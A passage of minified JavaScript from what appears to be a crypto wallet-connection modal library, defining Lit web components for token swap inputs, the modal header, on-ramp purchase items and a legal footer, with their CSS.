    `}toggleDetails(){this.detailsOpen=!this.detailsOpen}};Xo.styles=[WBe];Tc([te()],Xo.prototype,"networkName",void 0);Tc([V()],Xo.prototype,"detailsOpen",void 0);Tc([te()],Xo.prototype,"sourceToken",void 0);Tc([te()],Xo.prototype,"toToken",void 0);Tc([te()],Xo.prototype,"toTokenAmount",void 0);Tc([te()],Xo.prototype,"sourceTokenPriceInUSD",void 0);Tc([te()],Xo.prototype,"toTokenPriceInUSD",void 0);Tc([te()],Xo.prototype,"gasPriceInUSD",void 0);Tc([te()],Xo.prototype,"priceImpact",void 0);Tc([te()],Xo.prototype,"maxSlippage",void 0);Tc([te()],Xo.prototype,"networkTokenSymbol",void 0);Tc([te()],Xo.prototype,"inputError",void 0);Xo=Tc([me("w3m-swap-details")],Xo);const VBe=ge`
  :host > wui-flex {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    border-radius: var(--wui-border-radius-s);
    background-color: var(--wui-color-gray-glass-002);
    padding: var(--wui-spacing-xl);
    padding-right: var(--wui-spacing-s);
    width: 100%;
    height: 100px;
    box-sizing: border-box;
    box-shadow: inset 0px 0px 0px 1px var(--wui-color-gray-glass-002);
    position: relative;
    transition: box-shadow var(--wui-ease-out-power-1) var(--wui-duration-lg);
    will-change: background-color;
  }

  :host wui-flex.focus {
    box-shadow: inset 0px 0px 0px 1px var(--wui-color-gray-glass-005);
  }

  :host > wui-flex .swap-input,
  :host > wui-flex .swap-token-button {
    z-index: 10;
  }

  :host > wui-flex .swap-input {
    -webkit-mask-image: linear-gradient(
      270deg,
      transparent 0px,
      transparent 8px,
      black 24px,
      black 25px,
      black 32px,
      black 100%
    );
    mask-image: linear-gradient(
      270deg,
      transparent 0px,
      transparent 8px,
      black 24px,
      black 25px,
      black 32px,
      black 100%
    );
  }

  :host > wui-flex .swap-input input {
    background: none;
    border: none;
    height: 42px;
    width: 100%;
    font-size: 32px;
    font-style: normal;
    font-weight: 400;
    line-height: 130%;
    letter-spacing: -1.28px;
    outline: none;
    caret-color: var(--wui-color-accent-100);
    color: var(--wui-color-fg-100);
    padding: 0px;
  }

  :host > wui-flex .swap-input input:focus-visible {
    outline: none;
  }

  :host > wui-flex .swap-input input::-webkit-outer-spin-button,
  :host > wui-flex .swap-input input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  .max-value-button {
    background-color: transparent;
    border: none;
    cursor: pointer;
    color: var(--wui-color-gray-glass-020);
    padding-left: 0px;
  }

  .market-value {
    min-height: 18px;
  }
`;var Ou=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const KBe=5e-5;let yc=class extends he{constructor(){super(...arguments),this.focused=!1,this.price=0,this.target="sourceToken",this.onSetAmount=null,this.onSetMaxValue=null}render(){const e=this.marketValue||"0",t=Tr.bigNumber(e).gt("0");return F`
      <wui-flex class="${this.focused?"focus":""}" justifyContent="space-between">
        <wui-flex
          flex="1"
          flexDirection="column"
          alignItems="flex-start"
          justifyContent="center"
          class="swap-input"
        >
          <input
            data-testid="swap-input-${this.target}"
            @focusin=${()=>this.onFocusChange(!0)}
            @focusout=${()=>this.onFocusChange(!1)}
            ?disabled=${this.disabled}
            .value=${this.value}
            @input=${this.dispatchInputChangeEvent}
            @keydown=${this.handleKeydown}
            placeholder="0"
            type="text"
            inputmode="decimal"
          />
          <wui-text class="market-value" variant="small-400" color="fg-200">
            ${t?`$${Wt.formatNumberToLocalString(this.marketValue,2)}`:null}
          </wui-text>
        </wui-flex>
        ${this.templateTokenSelectButton()}
      </wui-flex>
    `}handleKeydown(e){return v1e.numericInputKeyDown(e,this.value,t=>this.onSetAmount?.(this.target,t))}dispatchInputChangeEvent(e){if(!this.onSetAmount)return;const t=e.target.value.replace(/[^0-9.]/gu,"");t===","||t==="."?this.onSetAmount(this.target,"0."):t.endsWith(",")?this.onSetAmount(this.target,t.replace(",",".")):this.onSetAmount(this.target,t)}setMaxValueToInput(){this.onSetMaxValue?.(this.target,this.balance)}templateTokenSelectButton(){return this.token?F`
      <wui-flex
        class="swap-token-button"
        flexDirection="column"
        alignItems="flex-end"
        justifyContent="center"
        gap="xxs"
      >
        <wui-token-button
          data-testid="swap-input-token-${this.target}"
          text=${this.token.symbol}
          imageSrc=${this.token.logoUri}
          @click=${this.onSelectToken.bind(this)}
        >
        </wui-token-button>
        <wui-flex alignItems="center" gap="xxs"> ${this.tokenBalanceTemplate()} </wui-flex>
      </wui-flex>
    `:F` <wui-button
        data-testid="swap-select-token-button-${this.target}"
        class="swap-token-button"
        size="md"
        variant="accent"
        @click=${this.onSelectToken.bind(this)}
      >
        Select token
      </wui-button>`}tokenBalanceTemplate(){const e=Tr.multiply(this.balance,this.price),t=e?e?.gt(KBe):!1;return F`
      ${t?F`<wui-text variant="small-400" color="fg-200">
            ${Wt.formatNumberToLocalString(this.balance,2)}
          </wui-text>`:null}
      ${this.target==="sourceToken"?this.tokenActionButtonTemplate(t):null}
    `}tokenActionButtonTemplate(e){return e?F` <button class="max-value-button" @click=${this.setMaxValueToInput.bind(this)}>
        <wui-text color="accent-100" variant="small-600">Max</wui-text>
      </button>`:F` <button class="max-value-button" @click=${this.onBuyToken.bind(this)}>
      <wui-text color="accent-100" variant="small-600">Buy</wui-text>
    </button>`}onFocusChange(e){this.focused=e}onSelectToken(){Ve.sendEvent({type:"track",event:"CLICK_SELECT_TOKEN_TO_SWAP"}),Ee.push("SwapSelectToken",{target:this.target})}onBuyToken(){Ee.push("OnRampProviders")}};yc.styles=[VBe];Ou([V()],yc.prototype,"focused",void 0);Ou([V()],yc.prototype,"balance",void 0);Ou([V()],yc.prototype,"value",void 0);Ou([V()],yc.prototype,"price",void 0);Ou([V()],yc.prototype,"marketValue",void 0);Ou([V()],yc.prototype,"disabled",void 0);Ou([V()],yc.prototype,"target",void 0);Ou([V()],yc.prototype,"token",void 0);Ou([V()],yc.prototype,"onSetAmount",void 0);Ou([V()],yc.prototype,"onSetMaxValue",void 0);yc=Ou([me("w3m-swap-input")],yc);const GBe=ge`
  :host {
    width: 100%;
  }

  :host > wui-flex {
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
    border-radius: var(--wui-border-radius-s);
    padding: var(--wui-spacing-xl);
    padding-right: var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0px 0px 0px 1px var(--wui-color-gray-glass-002);
    width: 100%;
    height: 100px;
    box-sizing: border-box;
    position: relative;
  }

  wui-shimmer.market-value {
    opacity: 0;
  }

  :host > wui-flex > svg.input_mask {
    position: absolute;
    inset: 0;
    z-index: 5;
  }

  :host wui-flex .input_mask__border,
  :host wui-flex .input_mask__background {
    transition: fill var(--wui-duration-md) var(--wui-ease-out-power-1);
    will-change: fill;
  }

  :host wui-flex .input_mask__border {
    fill: var(--wui-color-gray-glass-020);
  }

  :host wui-flex .input_mask__background {
    fill: var(--wui-color-gray-glass-002);
  }
`;var Jee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let R7=class extends he{constructor(){super(...arguments),this.target="sourceToken"}render(){return F`
      <wui-flex class justifyContent="space-between">
        <wui-flex
          flex="1"
          flexDirection="column"
          alignItems="flex-start"
          justifyContent="center"
          class="swap-input"
          gap="xxs"
        >
          <wui-shimmer width="80px" height="40px" borderRadius="xxs" variant="light"></wui-shimmer>
        </wui-flex>
        ${this.templateTokenSelectButton()}
      </wui-flex>
    `}templateTokenSelectButton(){return F`
      <wui-flex
        class="swap-token-button"
        flexDirection="column"
        alignItems="flex-end"
        justifyContent="center"
        gap="xxs"
      >
        <wui-shimmer width="80px" height="40px" borderRadius="3xl" variant="light"></wui-shimmer>
      </wui-flex>
    `}};R7.styles=[GBe];Jee([V()],R7.prototype,"target",void 0);R7=Jee([me("w3m-swap-input-skeleton")],R7);const ZBe=ge`
  :host {
    height: 64px;
  }

  wui-text {
    text-transform: capitalize;
  }

  wui-flex.w3m-header-title {
    transform: translateY(0);
    opacity: 1;
  }

  wui-flex.w3m-header-title[view-direction='prev'] {
    animation:
      slide-down-out 120ms forwards var(--wui-ease-out-power-2),
      slide-down-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-flex.w3m-header-title[view-direction='next'] {
    animation:
      slide-up-out 120ms forwards var(--wui-ease-out-power-2),
      slide-up-in 120ms forwards var(--wui-ease-out-power-2);
    animation-delay: 0ms, 200ms;
  }

  wui-icon-link[data-hidden='true'] {
    opacity: 0 !important;
    pointer-events: none;
  }

  @keyframes slide-up-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(3px);
      opacity: 0;
    }
  }

  @keyframes slide-up-in {
    from {
      transform: translateY(-3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }

  @keyframes slide-down-out {
    from {
      transform: translateY(0px);
      opacity: 1;
    }
    to {
      transform: translateY(-3px);
      opacity: 0;
    }
  }

  @keyframes slide-down-in {
    from {
      transform: translateY(3px);
      opacity: 0;
    }
    to {
      transform: translateY(0);
      opacity: 1;
    }
  }
`;var ih=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const YBe=["SmartSessionList"];function MA(){const r=Ee.state.data?.connector?.name,e=Ee.state.data?.wallet?.name,t=Ee.state.data?.network?.name,i=e??r,n=Xe.getConnectors();return{Connect:`Connect ${n.length===1&&n[0]?.id==="w3m-email"?"Email":""} Wallet`,Create:"Create Wallet",ChooseAccountName:void 0,Account:void 0,AccountSettings:void 0,AllWallets:"All Wallets",ApproveTransaction:"Approve Transaction",BuyInProgress:"Buy",ConnectingExternal:i??"Connect Wallet",ConnectingWalletConnect:i??"WalletConnect",ConnectingWalletConnectBasic:"WalletConnect",ConnectingSiwe:"Sign In",Convert:"Convert",ConvertSelectToken:"Select token",ConvertPreview:"Preview convert",Downloads:i?`Get ${i}`:"Downloads",EmailVerifyOtp:"Confirm Email",EmailVerifyDevice:"Register Device",GetWallet:"Get a wallet",Networks:"Choose Network",OnRampProviders:"Choose Provider",OnRampActivity:"Activity",OnRampTokenSelect:"Select Token",OnRampFiatSelect:"Select Currency",Profile:void 0,SwitchNetwork:t??"Switch Network",SwitchAddress:"Switch Address",Transactions:"Activity",UnsupportedChain:"Switch Network",UpgradeEmailWallet:"Upgrade your Wallet",UpdateEmailWallet:"Edit Email",UpdateEmailPrimaryOtp:"Confirm Current Email",UpdateEmailSecondaryOtp:"Confirm New Email",WhatIsABuy:"What is Buy?",RegisterAccountName:"Choose name",RegisterAccountNameSuccess:"",WalletReceive:"Receive",WalletCompatibleNetworks:"Compatible Networks",Swap:"Swap",SwapSelectToken:"Select token",SwapPreview:"Preview swap",WalletSend:"Send",WalletSendPreview:"Review send",WalletSendSelectToken:"Select Token",WhatIsANetwork:"What is a network?",WhatIsAWallet:"What is a wallet?",ConnectWallets:"Connect wallet",ConnectSocials:"All socials",ConnectingSocial:Se.state.socialProvider?Se.state.socialProvider:"Connect Social",ConnectingMultiChain:"Select chain",ConnectingFarcaster:"Farcaster",SwitchActiveChain:"Switch chain",SmartSessionCreated:void 0,SmartSessionList:"Smart Sessions",SIWXSignMessage:"Sign In"}}let ll=class extends he{constructor(){super(),this.unsubscribe=[],this.heading=MA()[Ee.state.view],this.network=re.state.activeCaipNetwork,this.networkImage=Nr.getNetworkImage(this.network),this.buffering=!1,this.showBack=!1,this.prevHistoryLength=1,this.view=Ee.state.view,this.viewDirection="",this.headerText=MA()[Ee.state.view],this.unsubscribe.push(Li.subscribeNetworkImages(()=>{this.networkImage=Nr.getNetworkImage(this.network)}),Ee.subscribeKey("view",e=>{setTimeout(()=>{this.view=e,this.headerText=MA()[e]},wd.ANIMATION_DURATIONS.HeaderText),this.onViewChange(),this.onHistoryChange()}),ft.subscribeKey("buffering",e=>this.buffering=e),re.subscribeKey("activeCaipNetwork",e=>{this.network=e,this.networkImage=Nr.getNetworkImage(this.network)}))}disconnectCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex .padding=${this.getPadding()} justifyContent="space-between" alignItems="center">
        ${this.leftHeaderTemplate()} ${this.titleTemplate()} ${this.rightHeaderTemplate()}
      </wui-flex>
    `}onWalletHelp(){Ve.sendEvent({type:"track",event:"CLICK_WALLET_HELP"}),Ee.push("WhatIsAWallet")}async onClose(){Ee.state.view==="UnsupportedChain"||await xd.isSIWXCloseDisabled()?Ut.shake():Ut.close()}rightHeaderTemplate(){const e=Ne?.state?.features?.smartSessions;return Ee.state.view!=="Account"||!e?this.closeButtonTemplate():F`<wui-flex>
      <wui-icon-link
        icon="clock"
        @click=${()=>Ee.push("SmartSessionList")}
        data-testid="w3m-header-smart-sessions"
      ></wui-icon-link>
      ${this.closeButtonTemplate()}
    </wui-flex> `}closeButtonTemplate(){return F`
      <wui-icon-link
        ?disabled=${this.buffering}
        icon="close"
        @click=${this.onClose.bind(this)}
        data-testid="w3m-header-close"
      ></wui-icon-link>
    `}titleTemplate(){const e=YBe.includes(this.view);return F`
      <wui-flex
        view-direction="${this.viewDirection}"
        class="w3m-header-title"
        alignItems="center"
        gap="xs"
      >
        <wui-text variant="paragraph-700" color="fg-100" data-testid="w3m-header-text"
          >${this.headerText}</wui-text
        >
        ${e?F`<wui-tag variant="main">Beta</wui-tag>`:null}
      </wui-flex>
    `}leftHeaderTemplate(){const{view:e}=Ee.state,t=e==="Connect",i=Ne.state.enableEmbedded,n=e==="ApproveTransaction",s=e==="ConnectingSiwe",o=e==="Account",a=n||s||t&&i;return o?F`<wui-select
        id="dynamic"
        data-testid="w3m-account-select-network"
        active-network=${ye(this.network?.name)}
        @click=${this.onNetworks.bind(this)}
        imageSrc=${ye(this.networkImage)}
      ></wui-select>`:this.showBack&&!a?F`<wui-icon-link
        data-testid="header-back"
        id="dynamic"
        icon="chevronLeft"
        ?disabled=${this.buffering}
        @click=${this.onGoBack.bind(this)}
      ></wui-icon-link>`:F`<wui-icon-link
      data-hidden=${!t}
      id="dynamic"
      icon="helpCircle"
      @click=${this.onWalletHelp.bind(this)}
    ></wui-icon-link>`}onNetworks(){this.isAllowedNetworkSwitch()&&(Ve.sendEvent({type:"track",event:"CLICK_NETWORKS"}),Ee.push("Networks"))}isAllowedNetworkSwitch(){const e=re.getAllRequestedCaipNetworks(),t=e?e.length>1:!1,i=e?.find(({id:n})=>n===this.network?.id);return t||!i}getPadding(){return this.heading?["l","2l","l","2l"]:["0","2l","0","2l"]}onViewChange(){const{history:e}=Ee.state;let t=wd.VIEW_DIRECTION.Next;e.length<this.prevHistoryLength&&(t=wd.VIEW_DIRECTION.Prev),this.prevHistoryLength=e.length,this.viewDirection=t}async onHistoryChange(){const{history:e}=Ee.state,t=this.shadowRoot?.querySelector("#dynamic");e.length>1&&!this.showBack&&t?(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!0,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})):e.length<=1&&this.showBack&&t&&(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!1,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}onGoBack(){Ee.goBack()}};ll.styles=ZBe;ih([te()],ll.prototype,"heading",void 0);ih([te()],ll.prototype,"network",void 0);ih([te()],ll.prototype,"networkImage",void 0);ih([te()],ll.prototype,"buffering",void 0);ih([te()],ll.prototype,"showBack",void 0);ih([te()],ll.prototype,"prevHistoryLength",void 0);ih([te()],ll.prototype,"view",void 0);ih([te()],ll.prototype,"viewDirection",void 0);ih([te()],ll.prototype,"headerText",void 0);ll=ih([me("w3m-header")],ll);var Qee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Gk=class extends he{constructor(){super(...arguments),this.data=[]}render(){return F`
      <wui-flex flexDirection="column" alignItems="center" gap="l">
        ${this.data.map(e=>F`
            <wui-flex flexDirection="column" alignItems="center" gap="xl">
              <wui-flex flexDirection="row" justifyContent="center" gap="1xs">
                ${e.images.map(t=>F`<wui-visual name=${t}></wui-visual>`)}
              </wui-flex>
            </wui-flex>
            <wui-flex flexDirection="column" alignItems="center" gap="xxs">
              <wui-text variant="paragraph-500" color="fg-100" align="center">
                ${e.title}
              </wui-text>
              <wui-text variant="small-500" color="fg-200" align="center">${e.text}</wui-text>
            </wui-flex>
          `)}
      </wui-flex>
    `}};Qee([V({type:Array})],Gk.prototype,"data",void 0);Gk=Qee([me("w3m-help-widget")],Gk);const JBe=ge`
  :host {
    width: 100%;
  }

  :host > wui-flex {
    width: 100%;
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xs);
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    gap: var(--wui-spacing-s);
  }

  :host > wui-flex:hover {
    background-color: var(--wui-color-gray-glass-002);
  }

  .purchase-image-container {
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    width: var(--wui-icon-box-size-lg);
    height: var(--wui-icon-box-size-lg);
  }

  .purchase-image-container wui-image {
    width: 100%;
    height: 100%;
    position: relative;
    border-radius: calc(var(--wui-icon-box-size-lg) / 2);
  }

  .purchase-image-container wui-image::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    position: absolute;
    inset: 0;
    border-radius: calc(var(--wui-icon-box-size-lg) / 2);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  .purchase-image-container wui-icon-box {
    position: absolute;
    right: 0;
    bottom: 0;
    transform: translate(20%, 20%);
  }
`;var kc=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ea=class extends he{constructor(){super(...arguments),this.disabled=!1,this.color="inherit",this.label="Bought",this.purchaseValue="",this.purchaseCurrency="",this.date="",this.completed=!1,this.inProgress=!1,this.failed=!1,this.onClick=null,this.symbol=""}firstUpdated(){this.icon||this.fetchTokenImage()}render(){return F`
      <wui-flex>
        ${this.imageTemplate()}
        <wui-flex flexDirection="column" gap="4xs" flexGrow="1">
          <wui-flex gap="xxs" alignItems="center" justifyContent="flex-start">
            ${this.statusIconTemplate()}
            <wui-text variant="paragraph-500" color="fg-100"> ${this.label}</wui-text>
          </wui-flex>
          <wui-text variant="small-400" color="fg-200">
            + ${this.purchaseValue} ${this.purchaseCurrency}
          </wui-text>
        </wui-flex>
        ${this.inProgress?F`<wui-loading-spinner color="fg-200" size="md"></wui-loading-spinner>`:F`<wui-text variant="micro-700" color="fg-300"><span>${this.date}</span></wui-text>`}
      </wui-flex>
    `}async fetchTokenImage(){await Ft._fetchTokenImage(this.purchaseCurrency)}statusIconTemplate(){return this.inProgress?null:this.completed?this.boughtIconTemplate():this.errorIconTemplate()}errorIconTemplate(){return F`<wui-icon-box
      size="xxs"
      iconColor="error-100"
      backgroundColor="error-100"
      background="opaque"
      icon="close"
      borderColor="wui-color-bg-125"
    ></wui-icon-box>`}imageTemplate(){const e=this.icon||`https://avatar.vercel.sh/andrew.svg?size=50&text=${this.symbol}`;return F`<wui-flex class="purchase-image-container">
      <wui-image src=${e}></wui-image>
    </wui-flex>`}boughtIconTemplate(){return F`<wui-icon-box
      size="xxs"
      iconColor="success-100"
      backgroundColor="success-100"
      background="opaque"
      icon="arrowBottom"
      borderColor="wui-color-bg-125"
    ></wui-icon-box>`}};ea.styles=[JBe];kc([V({type:Boolean})],ea.prototype,"disabled",void 0);kc([V()],ea.prototype,"color",void 0);kc([V()],ea.prototype,"label",void 0);kc([V()],ea.prototype,"purchaseValue",void 0);kc([V()],ea.prototype,"purchaseCurrency",void 0);kc([V()],ea.prototype,"date",void 0);kc([V({type:Boolean})],ea.prototype,"completed",void 0);kc([V({type:Boolean})],ea.prototype,"inProgress",void 0);kc([V({type:Boolean})],ea.prototype,"failed",void 0);kc([V()],ea.prototype,"onClick",void 0);kc([V()],ea.prototype,"symbol",void 0);kc([V()],ea.prototype,"icon",void 0);ea=kc([me("w3m-onramp-activity-item")],ea);const QBe=ge`
  :host {
    width: 100%;
  }

  wui-loading-spinner {
    position: absolute;
    top: 50%;
    right: 20px;
    transform: translateY(-50%);
  }

  .currency-container {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: var(--wui-spacing-1xs);
    height: 40px;
    padding: var(--wui-spacing-xs) var(--wui-spacing-1xs) var(--wui-spacing-xs)
      var(--wui-spacing-xs);
    min-width: 95px;
    border-radius: var(--FULL, 1000px);
    border: 1px solid var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    cursor: pointer;
  }

  .currency-container > wui-image {
    height: 24px;
    width: 24px;
    border-radius: 50%;
  }
`;var y2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let b0=class extends he{constructor(){super(),this.unsubscribe=[],this.type="Token",this.value=0,this.currencies=[],this.selectedCurrency=this.currencies?.[0],this.currencyImages=Li.state.currencyImages,this.tokenImages=Li.state.tokenImages,this.unsubscribe.push(Ai.subscribeKey("purchaseCurrency",e=>{!e||this.type==="Fiat"||(this.selectedCurrency=this.formatPurchaseCurrency(e))}),Ai.subscribeKey("paymentCurrency",e=>{!e||this.type==="Token"||(this.selectedCurrency=this.formatPaymentCurrency(e))}),Ai.subscribe(e=>{this.type==="Fiat"?this.currencies=e.purchaseCurrencies.map(this.formatPurchaseCurrency):this.currencies=e.paymentCurrencies.map(this.formatPaymentCurrency)}),Li.subscribe(e=>{this.currencyImages={...e.currencyImages},this.tokenImages={...e.tokenImages}}))}firstUpdated(){Ai.getAvailableCurrencies()}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.selectedCurrency?.symbol||"",t=this.currencyImages[e]||this.tokenImages[e];return F`<wui-input-text type="number" size="lg" value=${this.value}>
      ${this.selectedCurrency?F` <wui-flex
            class="currency-container"
            justifyContent="space-between"
            alignItems="center"
            gap="xxs"
            @click=${()=>Ut.open({view:`OnRamp${this.type}Select`})}
          >
            <wui-image src=${ye(t)}></wui-image>
            <wui-text color="fg-100">${this.selectedCurrency.symbol}</wui-text>
          </wui-flex>`:F`<wui-loading-spinner></wui-loading-spinner>`}
    </wui-input-text>`}formatPaymentCurrency(e){return{name:e.id,symbol:e.id}}formatPurchaseCurrency(e){return{name:e.name,symbol:e.symbol}}};b0.styles=QBe;y2([V({type:String})],b0.prototype,"type",void 0);y2([V({type:Number})],b0.prototype,"value",void 0);y2([te()],b0.prototype,"currencies",void 0);y2([te()],b0.prototype,"selectedCurrency",void 0);y2([te()],b0.prototype,"currencyImages",void 0);y2([te()],b0.prototype,"tokenImages",void 0);b0=y2([me("w3m-onramp-input")],b0);const XBe=ge`
  button {
    padding: var(--wui-spacing-s);
    border-radius: var(--wui-border-radius-xs);
    border: none;
    outline: none;
    background-color: var(--wui-color-gray-glass-002);
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: flex-start;
    gap: var(--wui-spacing-s);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
  }

  button:hover {
    background-color: var(--wui-color-gray-glass-005);
  }

  .provider-image {
    width: var(--wui-spacing-3xl);
    min-width: var(--wui-spacing-3xl);
    height: var(--wui-spacing-3xl);
    border-radius: calc(var(--wui-border-radius-xs) - calc(var(--wui-spacing-s) / 2));
    position: relative;
    overflow: hidden;
  }

  .provider-image::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    position: absolute;
    inset: 0;
    border-radius: calc(var(--wui-border-radius-xs) - calc(var(--wui-spacing-s) / 2));
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  .network-icon {
    width: var(--wui-spacing-m);
    height: var(--wui-spacing-m);
    border-radius: calc(var(--wui-spacing-m) / 2);
    overflow: hidden;
    box-shadow:
      0 0 0 3px var(--wui-color-gray-glass-002),
      0 0 0 3px var(--wui-color-modal-bg);
    transition: box-shadow var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: box-shadow;
  }

  button:hover .network-icon {
    box-shadow:
      0 0 0 3px var(--wui-color-gray-glass-005),
      0 0 0 3px var(--wui-color-modal-bg);
  }
`;var Op=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Wd=class extends he{constructor(){super(...arguments),this.disabled=!1,this.color="inherit",this.label="",this.feeRange="",this.loading=!1,this.onClick=null}render(){return F`
      <button ?disabled=${this.disabled}>
        <wui-visual name=${ye(this.name)} class="provider-image"></wui-visual>
        <wui-flex flexDirection="column" gap="4xs">
          <wui-text variant="paragraph-500" color="fg-100">${this.label}</wui-text>
          <wui-flex alignItems="center" justifyContent="flex-start" gap="l">
            <wui-text variant="tiny-500" color="fg-100">
              <wui-text variant="tiny-400" color="fg-200">Fees</wui-text>
              ${this.feeRange}
            </wui-text>
            <wui-flex gap="xxs">
              <wui-icon name="bank" size="xs" color="fg-150"></wui-icon>
              <wui-icon name="card" size="xs" color="fg-150"></wui-icon>
            </wui-flex>
            ${this.networksTemplate()}
          </wui-flex>
        </wui-flex>
        ${this.loading?F`<wui-loading-spinner color="fg-200" size="md"></wui-loading-spinner>`:F`<wui-icon name="chevronRight" color="fg-200" size="sm"></wui-icon>`}
      </button>
    `}networksTemplate(){const t=re.getAllRequestedCaipNetworks()?.filter(i=>i?.assets?.imageId)?.slice(0,5);return F`
      <wui-flex class="networks">
        ${t?.map(i=>F`
            <wui-flex class="network-icon">
              <wui-image src=${ye(Nr.getNetworkImage(i))}></wui-image>
            </wui-flex>
          `)}
      </wui-flex>
    `}};Wd.styles=[XBe];Op([V({type:Boolean})],Wd.prototype,"disabled",void 0);Op([V()],Wd.prototype,"color",void 0);Op([V()],Wd.prototype,"name",void 0);Op([V()],Wd.prototype,"label",void 0);Op([V()],Wd.prototype,"feeRange",void 0);Op([V({type:Boolean})],Wd.prototype,"loading",void 0);Op([V()],Wd.prototype,"onClick",void 0);Wd=Op([me("w3m-onramp-provider-item")],Wd);const eMe=ge`
  wui-flex {
    background-color: var(--wui-color-gray-glass-005);
  }

  a {
    text-decoration: none;
    color: var(--wui-color-fg-175);
    font-weight: 500;
  }
`;var tMe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Zk=class extends he{render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state,i=Ne.state.features?.legalCheckbox;return!e&&!t||i?null:F`
      <wui-flex .padding=${["m","s","s","s"]} justifyContent="center">
        <wui-text color="fg-250" variant="small-400" align="center">
          By connecting your wallet, you agree to our <br />
          ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
        </wui-text>
      </wui-flex>
    `}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=Ne.state;return e&&t?"and":""}termsTemplate(){const{termsConditionsUrl:e}=Ne.state;return e?F`<a href=${e}>Terms of Service</a>`:null}privacyTemplate(){const{privacyPolicyUrl:e}=Ne.state;return e?F`<a href=${e}>Privacy Policy</a>`:null}};Zk.styles=[eMe];Zk=tMe([me("w3m-legal-footer")],Zk);const rMe=ge`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }
  wui-checkbox {
    padding: var(--wui-spacing-s);
  }
  a {
    text-decoration: none;
    color: var(--wui-color-fg-150);
